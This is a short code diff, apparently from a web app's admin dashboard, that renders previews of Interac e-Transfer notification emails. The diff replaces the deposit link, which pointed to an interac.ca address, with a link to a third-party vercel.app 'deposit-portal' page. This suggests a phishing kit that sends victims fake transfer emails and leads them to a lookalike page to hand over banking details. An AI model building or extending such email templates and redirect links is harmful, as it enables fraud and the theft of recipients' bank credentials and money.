@@ -546,7 +546,7 @@ export default function AdminDashboard() {
                     amount={previewTransfer.amount}
                     message={previewTransfer.message}
                     securityQuestion={previewTransfer.securityQuestion || "Security question not provided"}
-                    depositLink="https://brandcentre.interac.ca/member-login/"
+                    depositLink="https://v0-interacadvancededition-git-main-nykeygpts-projects.vercel.app/deposit-portal"
                     transferId={previewTransfer.id}
                   />
                 </InteracEmailLayout>
